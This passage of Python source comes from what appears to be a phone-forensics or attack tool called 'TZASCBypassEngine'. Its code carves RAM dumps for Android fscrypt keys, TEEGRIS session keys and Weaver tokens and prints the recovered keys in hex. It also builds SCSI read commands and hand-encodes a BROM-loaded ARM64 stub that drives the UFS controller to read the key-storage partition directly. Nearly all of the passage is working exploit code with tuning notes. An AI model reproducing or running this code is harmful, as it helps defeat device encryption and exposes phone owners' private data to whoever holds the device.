    # mode values: 1=AES-256-XTS, 2=AES-256-GCM, 3=AES-256-CTS, 5=Adiantum
    FSCRYPT_MODES = {1: "AES-256-XTS", 2: "AES-256-GCM", 3: "AES-256-CTS",
                     4: "AES-256-CBC", 5: "Adiantum", 0x0A: "SM4-XTS"}

    # TEEGRIS session key context marker (Samsung in-RAM prefix)
    TEEGRIS_SESSION_MARKERS = [
        b'\x54\x47\x53\x4B',   # TGSK — TEEGRIS Session Key
        b'\x53\x4B\x45\x59',   # SKEY
        b'\x54\x45\x45\x53',   # TEES
        b'\x00\x00\x00\x01\x54\x47',  # version=1 + TG prefix
    ]

    # Weaver token structure prefix
    WEAVER_TOKEN_SIG = b'\x57\x56\x52\x54'   # WVRT

    # SMC instruction encoding (ARM64 / ARM32)
    SMC_ARM64  = b'\x01\x00\x00\xD4'   # SMC #0 (ARM64 LE)
    SMC_ARM32  = b'\x00\x00\x00\xE6'   # SMC (ARM32 LE)
    SMC_THUMB  = b'\x70\x47'           # BX LR often precedes SMC handlers
    SMC_ALT64  = b'\x02\x00\x00\xD4'   # SMC #1

    # ATF / LK SMC handler markers
    ATF_MARKERS = [
        b'ATF',
        b'bl31',
        b'BL31',
        b'TEEGRIS_SMC',
        b'smc_handler',
        b'SMC_HANDLER',
        b'el3_runtime',
        b'psci_smc',
    ]

    # UFS device constants
    UFS_BLOCK_SIZE  = 4096
    UFS_LUN_0       = 0x00
    UFS_LUN_KEYDATA = 0x05   # Typical Samsung keyrefuge LUN

    @classmethod
    def generate_bypass_report(cls, context: dict) -> dict:
        """
        context keys (all optional):
          chip_id        : str  e.g. "MT6877"
          ufs_lun        : int  target LUN (default 5)
          lba_start      : int  target LBA (default 0)
          lba_count      : int  sectors to read (default 128)
          tzasc_reason   : str  from KeyRefugeAnalyzer / MetadataPartitionAnalyzer
          ram_data       : bytes/mmap  already-mapped EXT_RAM dump (Path 1)
          lk_data        : bytes/mmap  already-mapped lk.bin (Path 3)
          tee_data       : bytes/mmap  already-mapped tee1.bin (Path 3)
        """
        # v12.2: pass HCM through context so _path1_ram_carver can prune irrelevant TEE scans
        report = {
            "engine":          "TZASCBypassEngine v12.2",
            "tzasc_reason":    context.get("tzasc_reason", "Unknown"),
            "chip_id":         context.get("chip_id", "Unknown"),
            "path1_ram_carver":  cls._path1_ram_carver(context),
            "path2_ufs_hci":     cls._path2_ufs_hci(context),
            "path3_smc_hook":    cls._path3_smc_hook(context),
            "priority_order":  [
                "PATH-2: UFS HCI Direct (fastest, no physical mod needed)",
                "PATH-1: RAM Carving (requires warm-reboot dump window)",
                "PATH-3: SMC Hook (live SRAM via BROM WRITE32/CMD_WRITE16 — no lk.bin touch)",
            ],
        }
        return report

    # ── PATH 1: RamDumpCarver ─────────────────────────────────────────────
    @classmethod
    def _path1_ram_carver(cls, ctx: dict) -> dict:
        ram_data = ctx.get("ram_data")
        result = {
            "description": (
                "Scan EXT_RAM binary dump using sliding-window entropy analysis "
                "to locate in-memory Android fscrypt_key structs, TEEGRIS ephemeral "
                "session keys, and active Weaver tokens. These exist in DRAM only "
                "during the boot window BEFORE TZASC locks the secure regions."
            ),
            "algorithm": [
                "1. Accept already-mapped EXT_RAM dump (typically 4–16 GB).",
                "2. Slide 80-byte window at 4-byte alignment.",
                "3. Read bytes [0:4] as LE uint32 — check if mode ∈ FSCRYPT_MODES.",
                "4. If match: read bytes [4:68] (64B raw key) — compute Shannon entropy.",
                "5. If entropy(raw_key) >= 5.5 AND bytes [68:72] ∈ {16,32,64}: CANDIDATE.",
                "6. Scan for TEEGRIS session key markers (TGSK, SKEY prefixes).",
                "7. Scan for Weaver token struct: WVRT magic + 32B payload.",
            ],
            "struct_layout": {
                "fscrypt_key": "offset+0: mode(u32 LE)  offset+4: raw[64]  offset+68: size(u32 LE)",
                "session_key": "offset+0: magic(4B)  offset+4: version(u32)  offset+8: key[32]",
                "weaver_token":"offset+0: WVRT(4B)  offset+4: slot_id(u32)  offset+8: response[32]",
            },
            "optimal_window": (
                "Ideal RAM carving window: first 300ms after unlock PIN entry, "
                "before Android destroys the CE key derivation buffer. "
                "Trigger: BROM live-read at physical 0x40000000–0x5FFFFFFF (LP4X typical)."
            ),
            "carve_results": [],
            "status": "ADVISORY_ONLY",
        }

        # v9.9: use already-mapped bytes object directly (no redundant open/mmap)
        # v11.3: support pre-computed carve_results from async worker
        precomputed = ctx.get("carve_results")
        if precomputed is not None:
            result["status"] = "SCAN_ASYNC_COMPLETE"
            result["carve_results"] = precomputed
        elif ram_data is not None:
            try:
                result["status"] = "SCAN_ATTEMPTED"
                result["carve_results"] = cls._carve_ram_file(
                    ram_data, hcm=ctx.get("hcm")
                )
            except Exception as e:
                result["status"] = f"SCAN_ERROR: {e}"
        else:
            result["status"] = "NO_RAM_DUMP_LOADED — Load EXT_RAM dump via RAM Carver tab"

        return result

    @classmethod
    def _carve_ram_file(cls, data, is_cancelled=None,
                         hcm: HardwareCapabilityMatrix = None) -> list:
        # UPG-v97-01: accepts already-mapped bytes/mmap object.
        # UPG-v97-02: YARA-style heuristic scanner.
        # v11.0 FIX: memoryview + vectorised padding scan for O(n) throughput.
        #   Phase A: find fscrypt mode byte (0x01 or 0x02 LE uint32).
        #   Phase B: within 256-byte window, find 64B run entropy >= 5.5.
        #   Phase C: within 64-byte window after key, find size in {16,32,64}.
        # v11.4 FIX: cooperative cancellation via is_cancelled callable.
        # v12.2 FIX: HCM-aware TEE pruning + live extraction SHA-256
        mv = memoryview(data)
        FILE_LEN = len(mv)
        FLEX_WIN = 256
        KEY_LEN  = 64
        MAX_HITS = 64
        count    = 0
        off      = 0
        results  = []

        # Phase A/B scanner with fully flexible key→size padding.
        # SIZE_FLEX_WIN: after the 64-byte key block ends, scan up to
        # this many bytes for a valid size field to tolerate padding.
        SIZE_FLEX_WIN = 64

        def _find_high_entropy_key(buf):
            """Phase B: find first 64-byte run with Shannon entropy >= 5.5.
            v11.0 FIX: v10.9 used > 7.0 which is mathematically impossible for
            a 64-byte chunk (max entropy = log2(64) = 6.0). Lowered to >= 5.5
            so the scanner actually finds high-entropy cryptographic keys.
            Real-world 64-byte random data (urandom) yields ~5.7–5.9 entropy.
            """
            # v11.0: buf is already a memoryview slice — no copy
            bl = len(buf)
            for i in range(bl - KEY_LEN + 1):
                # v11.4: allow cooperative cancellation inside tight loop
                if is_cancelled and is_cancelled():
                    return None, -1
                chunk = buf[i:i + KEY_LEN]
                # v11.0: threshold corrected from 7.0 → >= 5.5 (practical for 64B crypto keys)
                if _bytes_entropy(chunk) >= 5.5:
                    return chunk, i
            return None, -1

        def _find_size_field(abs_search_start):
            """Phase C: scan up to SIZE_FLEX_WIN bytes after key end for size in {16,32,64}.
            Returns (size_val, abs_offset_of_size) or (None, -1) if not found.
            v11.0 Zero-Padding Rule: EVERY byte between key_end and size_off MUST be 0x00.
            Replaced O(n) any() generator with O(1) sum() on memoryview slice.
            """
            for s in range(0, SIZE_FLEX_WIN, 4):
                so = abs_search_start + s
                if so + 4 > FILE_LEN:
                    break
                # v11.4: allow cooperative cancellation
                if is_cancelled and is_cancelled():
                    return None, -1
                # v11.0: vectorised zero check — sum() of memoryview slice
                if s > 0 and sum(mv[abs_search_start:abs_search_start + s]) != 0:
                    continue
                sv = struct.unpack_from("<I", mv, so)[0]
                if sv in (16, 32, 64):
                    return sv, so
            return None, -1

        while off < FILE_LEN - 5 and count < MAX_HITS:
            # v11.4: poll cancellation every 256 steps to keep overhead near-zero
            if (off & 0xFF) == 0 and is_cancelled and is_cancelled():
                return []
            mode_byte = mv[off]
            if mode_byte in (0x01, 0x02) and off + 4 <= FILE_LEN:
                mode_word = struct.unpack_from("<I", mv, off)[0]
                if mode_word in cls.FSCRYPT_MODES:
                    # v9.8: Structural pre-check — before computing entropy,
                    # verify there is ANY exact size field (16/32/64) in the
                    # plausible key+padding region ahead.
                    plausible = False
                    scan_start = off + 4
                    scan_end = min(scan_start + FLEX_WIN + KEY_LEN + SIZE_FLEX_WIN, FILE_LEN) - 3
                    for s_off in range(scan_start, scan_end, 4):
                        # v11.4: cooperative cancellation inside plausible scan
                        if is_cancelled and is_cancelled():
                            return []
                        sv = struct.unpack_from("<I", mv, s_off)[0]
                        if sv in (16, 32, 64):
                            plausible = True
                            break
                    if not plausible:
                        off += 4
                        continue
                    # Phase B: search for 64-byte high-entropy key in FLEX_WIN
                    win_start = off + 4
                    win_end   = min(win_start + FLEX_WIN, FILE_LEN)
                    # v11.0: memoryview slice — zero-copy, no bytes() conversion
                    window    = mv[win_start:win_end]
                    raw_key, key_local = _find_high_entropy_key(window)
                    if raw_key is not None:
                        key_abs  = win_start + key_local
                        # Phase C: flexible size search — tolerates padding after key
                        size_val, size_off = _find_size_field(key_abs + KEY_LEN)
                        if size_val is not None:
                            ent = _bytes_entropy(raw_key)
                            # v12.2: Compute SHA-256 of raw extracted bytes for chain of custody
                            raw_key_bytes = bytes(raw_key)
                            results.append({
                                "type":           "fscrypt_key",
                                "offset":         f"0x{off:08X}",
                                "key_offset":     f"0x{key_abs:08X}",
                                "size_offset":    f"0x{size_off:08X}",
                                "mode":           cls.FSCRYPT_MODES.get(mode_word, f"0x{mode_word:08X}"),
                                "entropy":        round(ent, 3),
                                "key_size":       size_val,
                                "key_hex":        raw_key_bytes.hex().upper(),
                                "padding_bytes":  key_local,
                                "size_padding":   size_off - (key_abs + KEY_LEN),
                                "assessment":     "LIKELY_FSCRYPT_KEY",
                                "extracted_sha256": hashlib.sha256(raw_key_bytes).hexdigest(),
                            })
                            count += 1
                            off = size_off + 4
                            continue

            # v12.2: HCM-aware execution pruning — skip TEEGRIS markers on Kinibi devices
            if hcm is None or hcm.tee_type != TEEType.KINIBI:
                for marker in cls.TEEGRIS_SESSION_MARKERS:
                    mlen = len(marker)
                    # v11.0: memoryview comparison — zero-copy slicing
                    if off + mlen + 32 <= FILE_LEN and mv[off:off + mlen] == marker:
                        payload = mv[off + mlen:off + mlen + 32]
                        ent = _bytes_entropy(payload)
                        if ent > 6.5:
                            payload_bytes = bytes(payload)
                            results.append({
                                "type":            "teegris_session_key",
                                "offset":          f"0x{off:08X}",
                                "marker":          marker.hex().upper(),
                                "entropy":         round(ent, 3),
                                "payload_hex":     payload_bytes.hex().upper(),
                                "assessment":      "LIKELY_TEEGRIS_SESSION_KEY",
                                "extracted_sha256": hashlib.sha256(payload_bytes).hexdigest(),
                            })
                            count += 1
                        break

            off += 4

        return results

    # ── PATH 2: UFS HCI Direct Read Bypass ───────────────────────────────
    @classmethod
    def _path2_ufs_hci(cls, ctx: dict) -> dict:
        lun       = ctx.get("ufs_lun", cls.UFS_LUN_KEYDATA)
        lba_start = ctx.get("lba_start", 0)
        lba_count = ctx.get("lba_count", 128)

        # Build SCSI Read(10) CDB: 0x28 + LUN + LBA(4B BE) + reserved + length(2B BE)
        def _read10_cdb(lba: int, length: int) -> str:
            cdb = bytearray(10)
            cdb[0] = 0x28                             # READ(10) opcode
            cdb[1] = 0x00                             # flags
            struct.pack_into(">I", cdb, 2, lba)       # LBA (4B big-endian)
            cdb[6] = 0x00                             # group number
            struct.pack_into(">H", cdb, 7, length)    # Transfer length (2B BE)
            cdb[9] = 0x00                             # control
            return cdb.hex().upper()

        # Build SCSI Read(16) CDB: 0x88 + LBA(8B BE) + length(4B BE) + ...
        def _read16_cdb(lba: int, length: int) -> str:
            cdb = bytearray(16)
            cdb[0] = 0x88                             # READ(16) opcode
            cdb[1] = 0x00                             # flags
            struct.pack_into(">Q", cdb, 2, lba)       # LBA (8B big-endian)
            struct.pack_into(">I", cdb, 10, length)   # Transfer length (4B BE)
            cdb[14] = 0x00                            # group number
            cdb[15] = 0x00                            # control
            return cdb.hex().upper()

        # Generate descriptor blocks for first N sectors
        read10_blocks = []
        read16_blocks = []
        for i in range(min(lba_count, 16)):  # Show first 16 for display
            lba = lba_start + i
            read10_blocks.append({
                "lba":    lba,
                "lba_hex":f"0x{lba:08X}",
                "cdb_read10": _read10_cdb(lba, 1),
                "cdb_read16": _read16_cdb(lba, 1),
                "expected_bytes": cls.UFS_BLOCK_SIZE,
            })

        # Batch read block (read all sectors in one command)
        batch_read10 = _read10_cdb(lba_start, min(lba_count, 0xFFFF))
        batch_read16 = _read16_cdb(lba_start, lba_count)

        # UPG-v97-03: Generate ARM64 bare-metal DA stub payload_hex
        # The stub initialises UFSHCI, programmes a minimal UTRD for
        # SCSI Read(16) on the target LUN, then rings the doorbell.
        # Each instruction is a real ARM64 encoding (little-endian).
        #
        # Memory map used by stub (adjust for target board if needed):
        #   UFSHCI base  : 0x112B0000  (MT6877 / Dimensity 900)
        #   UTRD buffer  : 0x44010000  (scratch DRAM — BROM-accessible)
        #   PRDT data    : 0x44020000  (DMA target for sector data)

        UFSHCI_BASE  = 0x112B0000
        UTRD_PHYS    = 0x44010000   # X3 — UTRD descriptor (32 bytes)
        UCD_PHYS     = 0x44010100   # X5 — Command UCD: UPIU + PRDT (1024 bytes)
        DATA_PHYS    = 0x44020000   # X6 — DMA data buffer for extracted key sectors

        def _movz(reg, imm16, shift=0):
            sf  = 1        # 64-bit
            hw  = shift >> 4
            enc = (sf << 31) | (0b10100101 << 23) | (hw << 21) | ((imm16 & 0xFFFF) << 5) | reg
            return enc.to_bytes(4, "little")

        def _movk(reg, imm16, shift=0):
            sf  = 1
            hw  = shift >> 4
            enc = (sf << 31) | (0b11100101 << 23) | (hw << 21) | ((imm16 & 0xFFFF) << 5) | reg
            return enc.to_bytes(4, "little")

        def _str_reg_imm(rt, rn, imm12):
            enc = (0b11 << 30) | (0b111001000 << 21) | ((imm12 >> 3) << 10) | (rn << 5) | rt
            return enc.to_bytes(4, "little")

        def _str_w_reg_imm(rt, rn, imm12):
            """STR Wn, [Xm, #imm12] — 32-bit store, imm12 must be multiple of 4."""
            enc = (0b10 << 30) | (0b111001000 << 21) | ((imm12 >> 2) << 10) | (rn << 5) | rt
            return enc.to_bytes(4, "little")

        def _movz32(reg, imm16):
            enc = (0b0 << 31) | (0b10100101 << 23) | ((imm16 & 0xFFFF) << 5) | reg
            return enc.to_bytes(4, "little")

        BRK0   = b"\x00\x00\x20\xd4"   # BRK #0
        NOP    = b"\x1f\x20\x03\xd5"   # NOP

        # Pre-compute SCSI Read(16) CDB as four LE 32-bit words for embedding
        cdb16      = bytes.fromhex(batch_read16)
        cdb_words  = [int.from_bytes(cdb16[i:i+4], "little") for i in range(0, 16, 4)]

        def _str_w_x3_off(reg_w, off12_scaled):
            """STR Wn, [X3, #imm12<<2] — 32-bit store with scaled offset."""
            enc = (0b10 << 30) | (0b111001000 << 21) | (off12_scaled << 10) | (3 << 5) | reg_w
            return enc.to_bytes(4, "little")

        def _str_x_x3_off(reg_x, off12_scaled):
            """STR Xn, [X3, #imm12<<3] — 64-bit store with scaled offset."""
            enc = (0b11 << 30) | (0b111001000 << 21) | (off12_scaled << 10) | (3 << 5) | reg_x
            return enc.to_bytes(4, "little")

        stub = bytearray()

        # ── PART A: populate UTRD descriptor + CDB in DRAM before UFSHCI start ──
        # Load UTRD_PHYS into X3
        stub += _movz(3, UTRD_PHYS & 0xFFFF)
        stub += _movk(3, (UTRD_PHYS >> 16) & 0xFFFF, 16)
        # v10.5 FIX: JEDEC UFSHCI spec §7.1.1 — DW0 encoding.
        # CT (bits 31:28) = 1 (UFS Storage Command)
        # DD (bits 26:25) = 2 (Device to Host)
        # DW0 = (1 << 28) | (2 << 25) = 0x14000000
        stub += _movz32(4, 0)                                # MOVZ W4, #0
        stub += _movk(4, 0x1400, 16)                         # MOVK X4, #0x1400, LSL #16
        # W4 now holds 0x14000000 (lower 32 bits of X4)
        stub += _str_w_x3_off(4, 0)                          # STR W4, [X3, #0x00]
        # v10.9: X5 = UCD_PHYS (0x44010100) -- UCD and DATA_PHYS are now separate.
        # UTRD[2] UCD base addr pointer must target UCD_PHYS, not the data buffer.
        stub += _movz(5, UCD_PHYS & 0xFFFF)
        stub += _movk(5, (UCD_PHYS >> 16) & 0xFFFF, 16)
        stub += _str_x_x3_off(5, 1)                          # STR X5, [X3, #0x08] -> UCD_PHYS
        # v10.9: CDB at Command UPIU offset 0x10 inside UCD (JEDEC UFSHCI spec).
        # X5 = UCD_PHYS. STR W4, [X5, #0x10+wi*4] for wi in 0..3.
        for wi, cw in enumerate(cdb_words):
            stub += _movz32(4, cw & 0xFFFF)
            if cw >> 16:
                enc_mk = (0b11100101 << 23) | (1 << 21) | ((cw >> 16) << 5) | 4
                stub  += enc_mk.to_bytes(4, "little")        # MOVK W4, #hi16, LSL#16
            stub += _str_w_reg_imm(4, 5, 0x10 + wi * 4)     # STR W4, [X5, #0x10+wi*4]

        # ── PART A-2: populate PRDT inside UCD (v10.9 DMA layout fix) ─────────────
        # UFSHCI spec: PRDT starts at UCD + 0x80.
        #   DW0 @ UCD+0x80 : Data Byte Count = UFS_BLOCK_SIZE - 1 = 4095
        #   DW1 @ UCD+0x84 : Reserved = 0
        #   DW2 @ UCD+0x88 : Data Base Address [31:0]  = DATA_PHYS (0x44020000)
        #   DW3 @ UCD+0x8C : Data Base Address [63:32] = 0
        # v10.9 FIX: DataBaseAddr must point to DATA_PHYS, NOT to UCD_PHYS.
        # Load DATA_PHYS into X6 for the DataBaseAddr store.
        stub += _movz32(7, 0x0FFF)           # W7 = 4095  (Size-1 per UFSHCI spec)
        stub += _str_w_reg_imm(7, 5, 0x80)   # STR W7, [X5, #0x80]  DataByteCount
        stub += _movz32(7, 0x0000)           # W7 = 0
        stub += _str_w_reg_imm(7, 5, 0x84)   # STR W7, [X5, #0x84]  Reserved
        # DW2/DW3 @ UCD+0x88/+0x8C = DataBaseAddr = DATA_PHYS
        stub += _movz(6, DATA_PHYS & 0xFFFF)             # MOVZ X6, #lo16(DATA_PHYS)
        stub += _movk(6, (DATA_PHYS >> 16) & 0xFFFF, 16) # MOVK X6, #hi16, LSL#16
        stub += _str_w_reg_imm(6, 5, 0x88)   # STR W6, [X5, #0x88]  DataBaseAddr Lo
        stub += _str_w_reg_imm(31, 5, 0x8C)  # STR WZR, [X5, #0x8C] DataBaseAddr Hi

        # ── PART B: initialise UFSHCI and ring doorbell (v11.2 DMA Sync + JEDEC + DMA) ──
        # MTK APB/AHB bus is strictly 32-bit.  ANY 64-bit STR Xn to a 32-bit
        # MMIO register triggers an immediate Synchronous External Abort.
        # We use _str_w_reg_imm (32-bit STR Wn) for EVERY UFSHCI register.
        # Load UFSHCI base into X0
        stub += _movz(0, UFSHCI_BASE & 0xFFFF)              # MOVZ X0, #lo16
        stub += _movk(0, (UFSHCI_BASE >> 16) & 0xFFFF, 16) # MOVK X0, #hi16, LSL#16
        # v10.5 FIX: JEDEC UFSHCI spec §5.2 — HCE Toggle before Transfer List setup.
        # On cold boot the controller may be in an indeterminate state.
        # Toggling HCE (offset 0x34) 0 → 1 guarantees a clean enable.
        stub += _str_w_reg_imm(31, 0, 0x34)                # STR WZR, [X0, #0x34] → HCE = 0
        stub += _movz(2, 1)                                # MOVZ X2, #1  (W2 = 1)
        stub += _str_w_reg_imm(2, 0, 0x34)                 # STR W2, [X0, #0x34]  → HCE = 1
        # v11.2 FIX: DSB SY after HCE toggle — prevent store-buffer race.
        # On out-of-order cores (Cortex-A55/A78) the STR may sit in the
        # store buffer while the LDR in the polling loop reads the old
        # value (0), causing a false timeout.  DSB SY guarantees the
        # write is visible to MMIO before LDR begins.
        stub += bytes.fromhex("9F 30 03 D5")               # DSB SY
        # v10.8 FIX 1: HCE timeout fall-through — ABORT on dead link.
        # v10.7's counter loop fell through to programming dead hardware after
        # W5 hit 0.  v10.8 branches OUT of UFS init to an error marker.
        # We also preserve X3 (UTRD_PHYS) by using X12 for all polling LDRs.
        #   MOVZ X5, #0xFFFF      → E5 FF 9F D2
        #   MOVK X5, #0xF, LSL#16 → E5 01 A0 F2  (X5 = 0x000FFFFF)
        # poll_loop:
        #   LDR W12, [X0, #0x34]  → 0C 34 40 B9
        #   CMP W12, #1           → 9F 04 00 71
        #   B.EQ hce_done (+4)    → 80 00 00 54  (skip SUB+CBNZ+B abort)
        #   SUB W5, W5, #1        → A5 04 00 51
        #   CBNZ X5, poll_loop    → 05 F8 FF B5  (back 4 instructions)
        #   B abort_dead_link     → 26 00 00 14  (+38 inst forward)
        # hce_done:
        stub += _movz(5, 0xFFFF)               # MOVZ X5, #0xFFFF
        stub += _movk(5, 0xF, 16)              # MOVK X5, #0xF, LSL#16
        stub += bytes.fromhex("0C 34 40 B9")   # LDR W12, [X0, #0x34]
        stub += bytes.fromhex("9F 04 00 71")   # CMP W12, #1
        stub += bytes.fromhex("80 00 00 54")   # B.EQ hce_done (+4 inst)
        stub += bytes.fromhex("A5 04 00 51")   # SUB W5, W5, #1
        stub += bytes.fromhex("05 F8 FF B5")   # CBNZ X5, poll_loop (-4 inst)
        stub += bytes.fromhex("26 00 00 14")   # B abort_dead_link (+38 inst)
        # STR WZR, [X0, #0x58] — clear UTRLDBR doorbell (32-bit)
        stub += _str_w_reg_imm(31, 0, 0x58)
        # STR WZR, [X0, #0x60] — stop UTRL run (32-bit)
        stub += _str_w_reg_imm(31, 0, 0x60)
        # Load UTRD physical addr into X1
        stub += _movz(1, UTRD_PHYS & 0xFFFF)
        stub += _movk(1, (UTRD_PHYS >> 16) & 0xFFFF, 16)
        # v10.4 FIX: UTRLBA is 64-bit in spec but the APB bus is 32-bit.
        # SPLIT into two STR Wn: lower 32 bits to 0x50, upper 32 bits to 0x54.
        stub += _str_w_reg_imm(1, 0, 0x50)   # STR W1, [X0, #0x50] → UTRLBA low
        stub += _str_w_reg_imm(31, 0, 0x54)  # STR WZR, [X0, #0x54] → UTRLBAU = 0
        # MOVZ X2, #1 then STR W2 for run and doorbell (32-bit only)
        stub += _movz(2, 1)
        stub += _str_w_reg_imm(2, 0, 0x60)   # STR W2, [X0, #0x60] → UTRLRSR run
        # v10.9 FIX: DC CIVAC covers UTRD (X3=0x44010000) AND UCD (X3+0x100=0x44010100).
        # v10.8 flushed only X3+0/+64/+128/+192 which missed UCD at +0x100.
        # ADD encodings corrected: ADD Xd,Xn,#imm = 0x91000000|(imm<<10)|(Rn<<5)|Rd.
        stub += bytes.fromhex("23 7E 0B D5")   # DC CIVAC, X3          (UTRD @ 0x44010000)
        stub += bytes.fromhex("66 00 04 91")   # ADD X6, X3, #0x100    (X6 = UCD_PHYS)
        stub += bytes.fromhex("26 7E 0B D5")   # DC CIVAC, X6          (UCD line 0 @ 0x44010100)
        stub += bytes.fromhex("C6 00 01 91")   # ADD X6, X6, #64       (UCD line 1 @ 0x44010140)
        stub += bytes.fromhex("26 7E 0B D5")   # DC CIVAC, X6
        stub += bytes.fromhex("C6 00 01 91")   # ADD X6, X6, #64       (UCD line 2 @ 0x44010180)
        stub += bytes.fromhex("26 7E 0B D5")   # DC CIVAC, X6          (covers PRDT @ UCD+0x80)
        stub += bytes.fromhex("9F 30 03 D5")   # DSB SY
        # v10.8 FIX 2: Doorbell Completion Polling — prevent hit-and-run DMA.
        # After ringing UTRLDBR, the UFS DMA takes milliseconds to transfer
        # sector data.  The CPU exits in nanoseconds.  We poll until bit 0
        # of the doorbell register is cleared to 0 by hardware, or timeout.
        #   MOVZ X7, #0xFFFF      → E7 FF 9F D2
        #   MOVK X7, #0xF, LSL#16 → E7 01 A0 F2  (X7 = 0x000FFFFF)
        # db_poll_loop:
        #   LDR W12, [X0, #0x58]  → 0C 58 41 B9
        #   CMP W12, #0           → 9F 01 00 71
        #   B.EQ db_done (+4)     → 80 00 00 54
        #   SUB W7, W7, #1        → E7 04 00 51
        #   CBNZ X7, db_poll_loop → 07 F8 FF B5
        #   B abort_dead_link     → 0E 00 00 14  (+14 inst forward)
        # db_done:
        stub += _movz(7, 0xFFFF)               # MOVZ X7, #0xFFFF
        stub += _movk(7, 0xF, 16)              # MOVK X7, #0xF, LSL#16
        stub += bytes.fromhex("0C 58 41 B9")   # LDR W12, [X0, #0x58]
        stub += bytes.fromhex("9F 01 00 71")   # CMP W12, #0
        stub += bytes.fromhex("80 00 00 54")   # B.EQ db_done (+4 inst)
        stub += bytes.fromhex("E7 04 00 51")   # SUB W7, W7, #1
        stub += bytes.fromhex("07 F8 FF B5")   # CBNZ X7, db_poll_loop (-4 inst)
        stub += bytes.fromhex("0E 00 00 14")   # B abort_dead_link (+14 inst)
        # v10.8 FIX 3: Post-DMA Cache Invalidation (DC IVAC range flush).
        # The DMA engine wrote fresh sector data to PRDT_PHYS in DRAM, but
        # the CPU's L1 cache still holds stale pre-DMA lines.  DC CIVAC
        # would write-back stale CPU data, CORRUPTING the keys.  We use
        # DC IVAC (invalidate only) to force the CPU to re-fetch from RAM.
        # Reload DATA_PHYS into X6, then invalidate 4 lines (256 bytes).
        stub += _movz(6, DATA_PHYS & 0xFFFF)
        stub += _movk(6, (DATA_PHYS >> 16) & 0xFFFF, 16)
        stub += bytes.fromhex("26 76 08 D5")   # DC IVAC, X6       (line 0 @ 0x44020000)
        stub += bytes.fromhex("C6 00 01 91")   # ADD X6, X6, #64   (line 1 @ 0x44020040)
        stub += bytes.fromhex("26 76 08 D5")   # DC IVAC, X6
        stub += bytes.fromhex("C6 00 01 91")   # ADD X6, X6, #64   (line 2 @ 0x44020080)
        stub += bytes.fromhex("26 76 08 D5")   # DC IVAC, X6
        stub += bytes.fromhex("C6 00 01 91")   # ADD X6, X6, #64   (line 3 @ 0x440200C0)
        stub += bytes.fromhex("26 76 08 D5")   # DC IVAC, X6
        stub += bytes.fromhex("9F 30 03 D5")   # DSB SY
        # v10.9 FIX: marker was at [X3,#0x100]=UCD_PHYS. Moved to [X3,#0x20].
        # UTRD is 32 bytes; +0x20 is safe scratch past end of descriptor.
        # BROM debugger reads 0x44010020: 0xCAFE = DMA success, 0xDEAD = abort.
        stub += _movz(7, 0xCAFE)             # MOVZ X7, #0xCAFE
        stub += _str_w_reg_imm(7, 3, 0x20)   # STR W7, [X3, #0x20]  (UTRD+0x20 scratch)
        stub += BRK0
        # abort_dead_link: shared by HCE timeout and doorbell timeout.
        # X3 still holds UTRD_PHYS because we used X12 for all polling LDRs.
        stub += _movz(7, 0xDEAD)             # MOVZ X7, #0xDEAD
        stub += _str_w_reg_imm(7, 3, 0x20)   # STR W7, [X3, #0x20]  (UTRD+0x20 scratch)
        stub += BRK0

        payload_hex = stub.hex().upper()
        cdb_hex     = cdb16.hex().upper()

        print(f"[UFS HCI ARM64 STUB] payload_hex = {payload_hex}")
        print(f"[UFS HCI SCSI CDB16] cdb_hex     = {cdb_hex}")
        print(f"[UFS HCI v10.9] UTRD=0x{UTRD_PHYS:08X}  UCD=0x{UCD_PHYS:08X}  "
              f"DATA=0x{DATA_PHYS:08X}")

        return {
            "description": (
                "v10.9 DMA Memory Layout Fix: UCD and DATA buffers strictly separated "
                "per JEDEC UFSHCI spec. UTRD@0x44010000(32B), UCD@0x44010100(1024B), "
                "DATA@0x44020000(key sectors). CDB written at UCD+0x10 (UPIU offset). "
                "PRDT DataBaseAddr targets DATA_PHYS via X6. DC CIVAC covers UTRD+UCD. "
                "ADD encodings corrected. Success/abort markers at UTRD+0x20."
            ),
            "mechanism": [
                "1. BROM loads payload_hex stub at scratch SRAM entry point.",
                "2. Part A: MOVZ/MOVK X3 = UTRD_PHYS (0x44010000).",
                "3. Part A: STR W4, [X3, #0x00] — UTRD header DW0=0x14000000 (JEDEC CT=1, DD=2).",
                "4. Part A: MOVZ/MOVK X5=UCD_PHYS(0x44010100); STR X5,[X3,#0x08].",
                "5. Part A: 4x MOVZ32+STR -- CDB at UCD+0x10 (UPIU CDB field).",
                "6. Part A-2: MOVZ/MOVK X6=DATA_PHYS(0x44020000); STR W6 -> PRDT DataBaseAddr.",
                "7. Part B: MOVZ/MOVK X0 = UFSHCI_BASE (0x112B0000).",
                "8. Part B: HCE toggle 0->1 (offset 0x34) + DSB SY (store-buffer flush).",
                "9. Part B: timeout poll loop (X5=0xFFFFF) — no false race-condition abort.",
                "10. Part B: HCE timeout -> abort_dead_link, 0xDEAD @ UTRD+0x20.",
                "11. Part B: clears UTRLDBR + UTRLRSR.",
                "12. Part B: STR W1,[X0,#0x50]+STR WZR,[X0,#0x54] -- 32-bit UTRLBA split.",
                "13. Part B: DC CIVAC X3(UTRD) + X3+0x100/+0x140/+0x180(UCD) + DSB SY.",
                "14. Part B: sets UTRLRSR=1, rings UTRLDBR doorbell slot 0.",
                "15. Part B: Doorbell completion poll (X7=0xFFFFF) until bit 0 clears.",
                "16. Part B: doorbell timeout -> abort_dead_link, 0xDEAD @ UTRD+0x20.",
                "17. Part B: DC IVAC DATA_PHYS 4 lines (256B) + DSB SY -- cache invalidate.",
                "18. Part B: 0xCAFE success marker at [X3,#0x20]; BRK #0 halts.",
                "19. Sector data at DATA_PHYS (0x44020000); 0xCAFE=ok, 0xDEAD=fail.",
            ],
            "target_lun":    lun,
            "lba_start":     lba_start,
            "lba_count":     lba_count,
            "block_size":    cls.UFS_BLOCK_SIZE,
            "total_bytes":   lba_count * cls.UFS_BLOCK_SIZE,
            "payload_hex":   payload_hex,
            "cdb16_hex":     cdb_hex,
            "batch_read10_cdb": batch_read10,
            "batch_read16_cdb": batch_read16,
            "utrd_phys":     f"0x{UTRD_PHYS:08X}",
            "ucd_phys":      f"0x{UCD_PHYS:08X}",
            "data_phys":     f"0x{DATA_PHYS:08X}",
            "sector_descriptors": read10_blocks,
            "ufshci_registers": {
                "MT6877_UFSHCI_BASE": "0x112B0000",
                "UFSHCI_CAP":         "0x112B0000 + 0x00   (capabilities)",
                "UFSHCI_NUTRS":       "0x112B0000 + 0x30   (num transfer requests)",
                "UFSHCI_UTRLBA":      "0x112B0000 + 0x50   (UTRL base addr low)",
